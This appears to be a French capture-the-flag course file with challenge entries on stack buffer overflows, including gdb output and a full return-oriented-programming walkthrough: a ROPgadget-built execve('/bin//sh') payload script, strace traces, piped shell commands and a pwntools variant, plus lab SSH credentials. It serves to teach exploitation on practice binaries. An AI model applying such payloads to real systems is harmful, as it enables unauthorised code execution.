    $ gdb -batch -ex='b 36'  -ex='run' -ex='info proc map'  -args ./say_hello5 $(python -c "print '\x90'*(212)")
    Breakpoint 1 at 0x8048503: file buffer_05.c, line 36.
    Breakpoint 1, main (argc=2, argv=0xffffdc64) at buffer_05.c:36
    36          if (argc<=1) { 
    process 476
    Mapped address spaces:

            Start Addr   End Addr       Size     Offset objfile
            0x8048000  0x8049000     0x1000        0x0 /home/zapp/say_hello5
            0x8049000  0x804a000     0x1000        0x0 /home/zapp/say_hello5
            0x804a000  0x804b000     0x1000     0x1000 /home/zapp/say_hello5
            0xf7e16000 0xf7e17000     0x1000        0x0 
            0xf7e17000 0xf7fc7000   0x1b0000        0x0 /lib/i386-linux-gnu/libc-2.23.so
            0xf7fc7000 0xf7fc9000     0x2000   0x1af000 /lib/i386-linux-gnu/libc-2.23.so
            0xf7fc9000 0xf7fca000     0x1000   0x1b1000 /lib/i386-linux-gnu/libc-2.23.so
            0xf7fca000 0xf7fcd000     0x3000        0x0 
            0xf7fd3000 0xf7fd4000     0x1000        0x0 
            0xf7fd4000 0xf7fd7000     0x3000        0x0 [vvar]
            0xf7fd7000 0xf7fd9000     0x2000        0x0 [vdso]
            0xf7fd9000 0xf7ffc000    0x23000        0x0 /lib/i386-linux-gnu/ld-2.23.so
            0xf7ffc000 0xf7ffd000     0x1000    0x22000 /lib/i386-linux-gnu/ld-2.23.so
            0xf7ffd000 0xf7ffe000     0x1000    0x23000 /lib/i386-linux-gnu/ld-2.23.so
            0xfffdd000 0xffffe000    0x21000        0x0 [stack]
    ```


[Buffer2_overflow_rop]
name:  ROP
status: 
value: 50
file:  buffer_rop.c
file2: rop_payload.py
category:  Buffer overflows 2
flag:  
description: 
    Lire deux explications:
    Hackndo: https://beta.hackndo.com/return-oriented-programming/
    Geluchat: https://www.dailysecurity.fr/return_oriented_programming/
    .
    Se connecter en ssh:
    ```
    ssh zapp@IPSERVER         
    mdp: kif
    ```
    Determiner la position de l'overflow
    ```
    $ python pattern.py 300 > /tmp/pattern
    $ gdb -batch -ex='run < /tmp/pattern' -args ./rop
    You password is incorrect

    Program received signal SIGSEGV, Segmentation fault.
    0x66413965 in ?? ()
    $ python pattern.py 0x66413965
    Pattern 0x66413965 first occurrence at position 148 in pattern.
    ```
    Générer une chaine de rop
    ```
    ROPgadget --binary rop --depth 3  --ropchain
    ```
    Copier/Coller le programme python généré, le nettoyer.
    Ajouter le pading initial, et un print final.
    ```
    #!/usr/bin/env python2
    # execve generated by ROPgadget

    from struct import pack

    # Padding goes here
    p = 'A'*148

    # On veut placer /bin en mémoire
    # On va le placer dans le segment .data du programme qui est en écriture.
    # Ok, on écrase ce qui était là...

    # On met l'adresse du segment .data dans edx
    p += pack('<I', 0x0806ee3a) # pop edx ; ret
    p += pack('<I', 0x080ea000) # @ .data

    # On met /bin dans eax
    p += pack('<I', 0x080b8186) # pop eax ; ret
    p += '/bin'

    # On place /bin dans le segment .data
    p += pack('<I', 0x0805486b) # mov dword ptr [edx], eax ; ret

    #
    # Tout pareil pour mettre //sh 4 octet après /bin
    #
    p += pack('<I', 0x0806ee3a) # pop edx ; ret
    p += pack('<I', 0x080ea004) # @ .data + 4
    p += pack('<I', 0x080b8186) # pop eax ; ret
    p += '//sh'
    p += pack('<I', 0x0805486b) # mov dword ptr [edx], eax ; ret

    #
    # On place 4 octets de 0 à la suite de /bin//sh
    #
    p += pack('<I', 0x0806ee3a) # pop edx ; ret
    p += pack('<I', 0x080ea008) # @ .data + 8
    p += pack('<I', 0x08049493) # xor eax, eax ; ret
    p += pack('<I', 0x0805486b) # mov dword ptr [edx], eax ; ret

    # 
    # On prépare l'appel de sys_execve
    #
    # ebx => .data : /bin//sh qui se termine par un 0
    # ecx =>  0000
    # edx =>  0000
    # eax = 0xd
    p += pack('<I', 0x080481c9) # pop ebx ; ret
    p += pack('<I', 0x080ea000) # @ .data
    p += pack('<I', 0x080de8ad) # pop ecx ; ret
    p += pack('<I', 0x080ea008) # @ .data + 8
    p += pack('<I', 0x0806ee3a) # pop edx ; ret
    p += pack('<I', 0x080ea008) # @ .data + 8
    p += pack('<I', 0x08049493) # xor eax, eax ; ret
    p += pack('<I', 0x0807a81f) # inc eax ; ret
    p += pack('<I', 0x0807a81f) # inc eax ; ret
    p += pack('<I', 0x0807a81f) # inc eax ; ret
    p += pack('<I', 0x0807a81f) # inc eax ; ret
    p += pack('<I', 0x0807a81f) # inc eax ; ret
    p += pack('<I', 0x0807a81f) # inc eax ; ret
    p += pack('<I', 0x0807a81f) # inc eax ; ret
    p += pack('<I', 0x0807a81f) # inc eax ; ret
    p += pack('<I', 0x0807a81f) # inc eax ; ret
    p += pack('<I', 0x0807a81f) # inc eax ; ret
    p += pack('<I', 0x0807a81f) # inc eax ; ret
    p += pack('<I', 0x0806cab5) # int 0x80
    print(p)
    ```
    On lance ./rop avec un strace:
    ```
    $ echo "yop" | strace ./rop
    execve("./rop", ["./rop"], [/* 14 vars */]) = 0
    strace: [ Process PID=649 runs in 32 bit mode. ]
    uname({sysname="Linux", nodename="ctf-buffer", ...}) = 0
    brk(NULL)                               = 0x8203000
    brk(0x8203d40)                          = 0x8203d40
    set_thread_area({entry_number:-1, base_addr:0x8203840, limit:1048575, seg_32bit:1, contents:0, read_exec_only:0, limit_in_pages:1, seg_not_present:0, useable:1}) = 0 (entry_number:12)
    readlink("/proc/self/exe", "/home/zapp/rop", 4096) = 14
    brk(0x8224d40)                          = 0x8224d40
    brk(0x8225000)                          = 0x8225000
    access("/etc/ld.so.nohwcap", F_OK)      = -1 ENOENT (No such file or directory)
    fstat64(0, {st_mode=S_IFIFO|0600, st_size=0, ...}) = 0
    read(0, "yop\n", 4096)                  = 4
    fstat64(1, {st_mode=S_IFCHR|0620, st_rdev=makedev(136, 0), ...}) = 0
    write(1, "You password is incorrect\n", 26You password is incorrect
    ) = 26
    ==> On termine le programme
    exit_group(0)                           = ?
    +++ exited with 0 +++
    ```
    On lance le rop avec un strace:
    ```
    $ /tmp/rop_payload.py | strace ./rop
    execve("./rop", ["./rop"], [/* 14 vars */]) = 0
    ... On retrouve les mêmes instructions
    ==> On part sur un appel système execve.
    execve("/bin//sh", [], [/* 0 vars */])  = 0
    strace: [ Process PID=653 runs in 64 bit mode. ]
    brk(NULL)                               = 0x55818d68b000
    ...
    ==> Le comportement est celui d'un /bin//sh classique 
    Ici, il exit au lieu d'ouvrir un tty
    read(0, "", 8192)                       = 0
    exit_group(0)                           = ?
    +++ exited with 0 +++
    ```
    Quelques outils:
    ```
    https://github.com/JonathanSalwan/ROPgadget
    https://github.com/david942j/one_gadget
    https://github.com/sashs/Ropper
    ```
    Nous ne pouvons pas ouvrir de terminal, nous allons injecter nos commandes à la suite de la payload
    ```
    ....
    p += pack('<I', 0x0806cab5) # int 0x80
    p += "\n" * 10000 # une rampe de retour à la ligne 
    p += "id; ls\n"   # nos commandes bash: id et ls
    print(p)
    ```
    Et c'est reparti
    ```
    $ /tmp/rop_payload.py | ./rop
    You password is incorrect
    uid=1005(zapp) gid=1005(zapp) groups=1005(zapp)
    buffer_05.c  buffer_rop.c  pattern.py  rop  say_hello5
    ```
    Success :)







[Buffer2_overflow_rop_pwn]
name:  ROP interactif avec pwntools
status: 
value: 50
category:  Buffer overflows 2
flag:  
description: 
    La librairie python pwntools permet de récupérer un tty avec la fonction r.interactive()  
    ```
    #coding: utf-8

    from pwn import *
    from struct import pack

    r = process("./rop")

    p = "A"*148
    p += pack('<I', 0x0806ed1a) 	# pop edx ; ret
    ...
    p += pack('<I', 0x0806c985) 	# int 0x80

    r.sendline(p)
    r.interactive()
    ```





#    https://thinkloveshare.com/hacking/pwn_1of4_buffer_overflow/slides_conf_123_pwned.pdf
#    https://www.shadesec.com/exploitation/2017/01/12/rop-chain-tutorial.html
#    https://old.liveoverflow.com/binary_hacking/protostar/
#    Buffer overflow on modern ubuntu  all protection on
#    https://old.liveoverflow.com/blog/stack0_buffer_overflow_on_ubuntu.html

# writups: https://tuonilabs.wordpress.com/2018/07/31/rop-write-ups/
#          https://larry.ngrep.me/2018/06/28/basic-rop-write-up/
# cours: https://www.cs.virginia.edu/~cr4bd/4630/S2017/assignments/rop.html
